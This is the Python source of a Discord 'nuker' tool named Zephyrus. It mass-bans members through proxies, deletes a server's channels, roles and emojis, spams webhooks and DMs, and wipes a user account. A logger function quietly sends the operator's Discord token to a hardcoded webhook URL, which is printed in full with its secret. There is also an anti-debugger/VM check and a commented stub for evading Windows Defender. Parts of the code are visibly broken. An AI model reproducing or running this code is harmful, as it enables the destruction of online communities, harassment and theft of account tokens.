import discord
from discord.ext import commands
import colorama
from colorama import Fore, Back, Style, init
import requests
import os
from os import system
import json
import threading
import string
import random
import time
import json
import asyncio
import aiohttp
from discord import Webhook, AsyncWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
import base64
from termcolor import colored
from colored import fg, attr
import sys
import psutil
import inspect
import itertools
from itertools import cycle
import socket
import pystyle
from pystyle import Colors, Colorate, Center
import ctypes
from urllib.request import urlopen, Request
from json import loads
import subprocess
import base64
from time import strftime, gmtime
from dotenv import load_dotenv
from pypresence import Presence


def slow_write(text):
    for sw in text: print('' + sw, end="");sys.stdout.flush();time.sleep(0.005)


loginlogo = """
        ╔═╗╔═╗╔═╗╦ ╦╦ ╦╦═╗╦ ╦╔═╗  ╦  ╔═╗╔═╗╦╔╗╔
        ╔═╝║╣ ╠═╝╠═╣╚╦╝╠╦╝║ ║╚═╗  ║  ║ ║║ ╦║║║║
        ╚═╝╚═╝╩  ╩ ╩ ╩ ╩╚═╚═╝╚═╝  ╩═╝╚═╝╚═╝╩╝╚╝
        """

slow_write(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, loginlogo, 3)))

slow_write(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID{Fore.WHITE} [>>>]")
##key = input()

##load_dotenv()
##authwords = os.environ['admin']
#authwords = os.environ['auth']
##while True:
##    if key == authwords:
##      slow_write(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>]")
guilds = input()
os.remove("zephyrus/zguild.txt")
guildsid = 0
with open('zephyrus/zguild.txt', 'a') as g:
    for guild in guilds:
      g.write(guild)
      guildsid += 1
      g.close()
      break
    else:
        print(f"{Fore.LIGHTRED_EX}Invalid Guild ID")
        os._exit(0)



with open('zephyrus.json') as f:
 zephyrus = json.load(f)

def login():
    username = zephyrus.get('Username')
    usernameInput = input("enter username: ")
    if username != usernameInput:
      print("\033[1;31;40mInvalid username")
      os._exit(0)
    if username == usernameInput:
      zephyrus.main()
    CheckUsername = zephyrus.get('Username') 
    if CheckUsername == '' or "":
     registeruser = input("register username: ")
    registeruser.append(username)
    return login()

  # add password funcs
  
with open('zephyrus.json') as f:
    zephyrus = json.load(f)

token = zephyrus.get('Token')
prefix = zephyrus.get('Prefix')
channel_names = zephyrus.get('Channel-Names')
role_names = zephyrus.get('Role-Names')
reason = zephyrus.get('Reason')
webhook_names = zephyrus.get('Webhook-Names')
spam_messages = zephyrus.get('Spam-Messages')
guildname = zephyrus.get('Guild-Name')
langchange = zephyrus.get('Lang')

langs = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

#def bypasswindef():
  #mainfile = open('main.py')
  #try:
      
    #with open(mainfile, 'rb') as f:
     #data = f.read()

    #with open(mainfile, 'b64', 'wb') as f:
      #f.write(base64.encodebytes(data))
      #exec(f)

# windows defender bypass / virus total bypass, might not work [ <TODO> finish ]

if os.name == "nt":
  ctypes.windll.kernel32.SetConsoleTitleW("Zephyrus Nuker")

os.system('cls')

intents = discord.Intents.default()
intents.members = True
session = requests.Session()



def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()

if token_type == "user":
    headers = {
    'Authorization': f'{token}'
    'User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
    }
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {
    'Authorization': f'{token}'
    'User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
    }
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, intents=intents)


client.remove_command('help')
spam = True



class zephyrus:

  async def webspam():
    lol=input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Webhook URL{Fore.WHITE} [>>>]")
    webusername = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Webhook Username{Fore.WHITE} [>>>]")
    messagespam = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Webhook Message{Fore.WHITE} [>>>]")
    ammount =int(input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Ammount{Fore.WHITE} [>>>]"))
    webav = ("https://cdn.discordapp.com/attachments/816128594908676136/838799620900388874/money.gif")

    webhook = DiscordWebhook(url=lol,content=messagespam, username=webusername, avatar_url=(webav))
    for i in range(ammount):
      response = webhook.execute()
    print (f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Successfully Spammed{Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{messagespam}")
    time.sleep(2)
    await zephyrus.main()

  async def serverdmall(self):
    serverid = open('zephyrus/zguild.txt').read()
    dmessage = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Message Here{Fore.WHITE} [>>>]")
    guild = self.get_guild(int(serverid))
    self.to_dm = []
    if not guild:
        print(f"{Fore.LIGHTRED_EX}Could't Find Server")
    else:
        for y in range(int(guild.member_count)-1):
              try:
                  data = await guild.members[y].create_dm()
                  print(f"created a dm for {str(guild.members[y])}")
                  threading.Thread(target=self.to_dm.append, args=(data.recipient,)).start()
              except:
                pass
                if self.to_dm == [] or len(self.to_dm) == 0:
                    print(f"{Fore.LIGHTRED_EX}Users Could Not Be Scraped")
                else:
                    for recipient in self.to_dm:
                        try:
                            await recipient.send(dmessage)
                            print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Dm Sent To{Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{recipient}")
                        except:
                            continue
                            time.sleep(2)
                            await zephyrus.main()

  async def dmall():
    message = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Message Here{Fore.WHITE} [>>>]")
    try:
        for a in client.private_channels:
            await a.send(message)
            print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Sent To{Fore.WHITE} [>>>]{a}")
    except:
        pass
    time.sleep(2)
    await zephyrus.main()
  

  def channeldfunction(guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Deleted Channel {Fore.WHITE}[>>>] {Fore.LIGHTRED_EX}{channel.strip()}')
                    break
                else:
                    break

  def emojidelete(guild, emoji):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/emojis", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Deleted Emoji {Fore.WHITE}[>>>] {Fore.LIGHTRED_EX}{emoji.strip()}")
                    break
                else:
                    break

  def channelc(guild, name):
        while True:
            json = {'name': random.choice(channel_names), 'type': 0}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTBLACK_EX} Created {Fore.WHITE}[>>>]{Fore.LIGHTRED_EX} {json['name']}")
                    if spam == True:
                      webhook = zephyrus.CreateWebhook(r.json()['id'])
                      threading.Thread(target=zephyrus.SendWebhook, args=(webhook,)).start()
                    break
                else:
                    break

  def roledfunction(guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
                print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Deleted Role {Fore.WHITE}[>>>] {Fore.LIGHTRED_EX}{role.strip()}')
                    break
                else:
                    break

  def rolecfunction(guild, role):

        try:
            json = {
                'hoist': 'true',
                'name': random.choice(role_names),
                'mentionable': 'true',
                'color': random.randint(1000000,9999999),
                'permissions': random.randint(1,10)
            }
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Created {Fore.WHITE}[>>>]{Fore.LIGHTRED_EX} {json['name']}")
            else:
                print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Couldn't Create {Fore.WHITE}[>>>]{Fore.LIGHTRED_EX} {json['name']}")
        except:
            pass


  def internals():
    name = os.getenv("COMPUTERNAME")
    users = os.getenv("UserName")
    hostname = socket.gethostname
    victs = []

    details = [
      f"Name: {name}\nUsername: {users}\nHostname: {hostname}"
    ]
    localmachine = ("./Desktop/") # add local mech

    victs.append(details)
    with open("users.txt", "w") as f:
      for line in victs:
        f.write(victs)
        f.close()
      name = os.getenv("COMPUTERNAME")

      if name != "pc name here":
        f.turnicate(0)
        f.close()
      elif name == "pc name here":
        f.open('users.txt')


  async def beamer(ctx, user: discord.User, text):
    text = input("enter message [>>>] ")
    usertarg = input("enter id of target: ")
    target = client.get_user(int(usertarg))
    await target.send(text)


  def multiban(guild, member):
    proxies = open('proxies.txt').read().split('\n')
    proxy = cycle(proxies)
    token1 = ["token", "token"]
    tkncyc = random.choice(token1)
    headers = {
      'Authorization': f'{tkncyc}',
      'Content-Type': 'application/json'
    }
    try:
      json = {'reason': reason}
      r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers,json=json, proxies={
          "http": 'http://' + next(proxy)
        })
      if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
      else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Banned{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {member.strip()}")
    except:
          pass

  async def cycleban():
   guild = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>]")
   print()
   members = open('zephyrus/zmem.txt')
   for i in range(10):
    for member in members:
        threading.Thread(target=zephyrus.multiban, args=(guild, member,)).start()
        members.close()
        time.sleep(2)
        await zephyrus.main()



  

  def Ban(guild, member):
      proxies = open('proxies.txt').read().split('\n')
      proxy = cycle(proxies)
      try:
        json = {'reason': reason}
        r = session.put(f"https://canary.discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers,json=json, proxies={
          "http":f"socks5://{next(proxy)}"
        })
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"{Fore.LIGHTMAGENTA_EX}Got ratelimited, retrying after: {r.json()['retry_after']} s.")
        else:
            if r.status_code == 204:
                print(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Banned{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {member.strip()}")
      except:
          pass
        

  def CreateWebhook(channel):
        try:
            json = {
                'name': random.choice(webhook_names),
            }
            r = requests.post(f'https://discord.com/api/v9/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass
  
  def SendWebhook(webhook):
        try:
            for i in range(1000):
                payload={
                    'username': random.choice(webhook_names),
                    'content': random.choice(spam_messages)
                }
                requests.post(webhook, json=payload)
        except:
            pass

  async def main():
        os.system(f'cls & title ~ Zephyrus Menu')

        logo = """
        ╔═╗╔═╗╔═╗╦ ╦╦ ╦╦═╗╦ ╦╔═╗
        ╔═╝║╣ ╠═╝╠═╣╚╦╝╠╦╝║ ║╚═╗
        ╚═╝╚═╝╩  ╩ ╩ ╩ ╩╚═╚═╝╚═╝
        """
        slow_write(Center.XCenter(Colorate.Vertical(Colors.purple_to_blue, logo, 3)))

        
        choice = input(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Choice{Fore.WHITE} [>>>]")
        if choice == '1':
          guild = open('zephyrus/zguild.txt').read()
          print()
          members = open('zephyrus/zmem.txt')
          for i in range(10):
            for member in members:
              threading.Thread(target=zephyrus.Ban, args=(guild, member,)).start()
            members.close()
            time.sleep(2)
            await zephyrus.main()
          
        elif choice == '2':
            guild = open('zephyrus/zguild.txt').read()
            channelamount = input(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Channel Amount{Fore.WHITE} [>>>]')
            roleamount = input(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Role Amount{Fore.WHITE} [>>>]')
 

            members = open('zephyrus/zmem.txt')
            channels = open('zephyrus/zchan.txt')
            roles = open('zephyrus/zrole.txt')
            emojis = open('zephyrus/zemoji.txt')
            for i in range(10):
              for member in members:
                threading.Thread(target=zephyrus.Ban, args=(guild,member,)).start()
            for channel in channels:
                threading.Thread(target=zephyrus.channeldfunction,args=(guild,channel,)).start()
            for role in roles:
                threading.Thread(target=zephyrus.roledfunction,args=(guild,role,)).start()
            for i in range(int(channelamount)):
                threading.Thread(target=zephyrus.channelc,args=(guild,channel_names,)).start()
            for i in range(int(roleamount)):
                threading.Thread(target=zephyrus.rolecfunction, args=(guild,role_names,)).start()
            for emoji in emojis:
               threading.Thread(target=zephyrus.emojidelete,args=(guild,emoji,)).start()
            members.close()
            channels.close()
            roles.close()
            emojis.close
            time.sleep(2)
            await zephyrus.main()

        elif choice == '3':
          guild = open('zephyrus/zguild.txt').read()
          channels = open('zephyrus/zchan.txt')
          for channel in channels:
            threading.Thread(target=zephyrus.channeldfunction,args=(guild,channel,)).start()
            channels.close()
            time.sleep(2)
            await zephyrus.main()

        elif choice == '5': 
         guild = open('zephyrus/zguild.txt').read()
         channelamount = input(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Channel Amount{Fore.WHITE} [>>>]')
         channels = open('zephyrus/zchan.txt')
         for i in range(int(channelamount)):
                threading.Thread(target=zephyrus.channelc,args=(guild,channel_names,)).start()
         channels.close()
         time.sleep(2)
         await zephyrus.main()

        elif choice == '10':
          await zephyrus.cycleban()

        elif choice == 'c':
          await zephyrus.credits()
          


        elif choice == '8':
         guild = open('zephyrus/zguild.txt').read()
         await client.wait_until_ready()
         guildOBJ = client.get_guild(int(guild))
         members = await guildOBJ.chunk()

         
         os.remove("zephyrus/zmem.txt")
         os.remove("zephyrus/zchan.txt")
         os.remove("zephyrus/zrole.txt")
         os.remove("zephyrus/zemoji.txt")
       
        

        membercount = 0
        with open('zephyrus/zmem.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            slow_write(f'\n{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {membercount} Member IDS')
            print()
            m.close()

        channelcount = 0
        with open('zephyrus/zchan.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {channelcount} Channel IDS')
            print()
            c.close()

        rolecount = 0
        with open('zephyrus/zrole.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {rolecount} Role IDS')
            print()
            r.close()

        emojicount = 0
        with open('zephyrus/zemoji.txt', 'a') as e:
            for emoji in guildOBJ.emojis:
                e.write(str(emoji.id) + "\n")
                emojicount += 1
            slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("[%H:%M:%S]", gmtime())}{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {emojicount} Emoji IDS\n')
            print()
            r.close()
            time.sleep(2)
            await zephyrus.main()
        
        

#https://discord.com/api/webhooks/915436917003280444/ndvbv11dRoAnpTcYv9PjAnUyzMP1BPQnHF-3qaghliTWkMNNgQy5GEqBMWEH077ErHF4
  async def logger():


        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url('https://discord.com/api/webhooks/915436917003280444/ndvbv11dRoAnpTcYv9PjAnUyzMP1BPQnHF-3qaghliTWkMNNgQy5GEqBMWEH077ErHF4', adapter=AsyncWebhookAdapter(session))
            if token_type == "user" or "bot":
                embed = discord.Embed(color=0x2f3136, description=f'''```{token}```''')
            embed.set_footer(text='zephyrus panel', icon_url='https://cdn.discordapp.com/attachments/808684424723693571/877945235852918784/image1.png')
            try:
                await webhook.send(embed=embed, username="zephyrus", avatar_url="https://cdn.discordapp.com/attachments/808684424723693571/877945235852918784/image1.png")
            except:
                pass


  async def accwizz():
    await client.user.edit_settings(theme=discord.Theme.light, locale=langchange, developer_mode=False, animate_emojis=False, gif_auto_play=False, render_reactions=False, default_guilds_restricted=True, message_display_compact=True)
    for friend in client.user.friends:
        try:
         slow_write(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Unfriended {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{friend}")
         await friend.remove_friend()
        except:
         slow_write(f"{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Failed To Unfriend {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{friend}")
    for user in client.user.blocked:
            await user.unblock() 
            slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Unblocked {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{user}')     
    for guild in client.guilds:
            try:
                await guild.delete()
                slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Deleted {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{guild}')
            except:
                pass
            try:
                await guild.leave()
                slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Left {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{guild}')
            except:
                pass
    for i in range(100):
            await client.create_guild(name=guildname)
            slow_write(f'{Style.BRIGHT}{Fore.LIGHTBLACK_EX} Made {Fore.WHITE} [>>>] {Fore.LIGHTRED_EX}{guildname}')
    time.sleep(2)
    await zephyrus.main()


  async def DebuggerCheck(self):
        try:
            while True:
                if self.is_debugged() == True or self.is_virtualized() == True:
                    os.abort()
                    os._exit(0)
                await asyncio.sleep(7)
        except:
            pass

  def Startup():
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            slow_write(f'{Fore.LIGHTRED_EX}Invalid Token')
            input()
            os._exit(0)

  def RichPresence():
        try:
            RPC = Presence("921114455805415436") 
            RPC.connect() 
            RPC.update(details="Utilizing", large_image="zephy1", small_image="zephy2", 
            large_text="github.com/retributions", start=time.time())
        except:
            pass

  rich_presence = RichPresence()

  async def credits():
    print('''
      Credits to Solar and Xoy
      https://github.com/retributions
      https://github.com/enforcd
    ''')



@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f'{Style.BRIGHT}{Fore.LIGHTBLUE_EX}{strftime("%H:%M:%S", gmtime())}{Fore.LIGHTRED_EX} Command Not Found {Fore.GREEN} {ctx.message.content}')
    pass



@client.event 
async def on_ready():
  try:
    await zephyrus.main()
    await zephyrus.logger()
    await zephyrus.logs()
    await zephyrus.RichPresence()
  except:
      await zephyrus.main()



if __name__ == "__main__":
  loop = asyncio.get_event_loop()
  loop.create_task(zephyrus().DebuggerCheck())
  zephyrus.Startup()
  



